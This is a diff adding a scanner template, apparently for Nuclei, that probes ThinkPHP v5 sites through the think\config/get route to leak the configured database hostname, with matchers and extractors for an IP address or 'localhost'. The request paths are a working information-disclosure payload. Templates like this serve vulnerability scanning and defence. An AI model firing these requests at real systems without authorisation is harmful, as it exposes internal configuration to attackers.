@@ -1,0 +1,43 @@
+id: poc-local-thinkphp-v5-think-config-database-info-leak
+
+info:
+  name: poc-local-thinkphp-v5-think-config-database-info-leak
+  author: capiton
+  severity: medium
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/index.php?s=index/think\config/get&name=database.hostname'
+      - '{{BaseURL}}/public/index.php?s=index/think\config/get&name=database.hostname'
+      - '{{BaseURL}}/index.php?s=think\config/get&name=database.hostname'
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - '((?:(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d)))\.){3}(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d))))'
+          - 'localhost'
+        condition: or
+
+      - type: dsl
+        dsl:
+          - 'len(body) < 20'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))*'  
+          - '(localhost)'
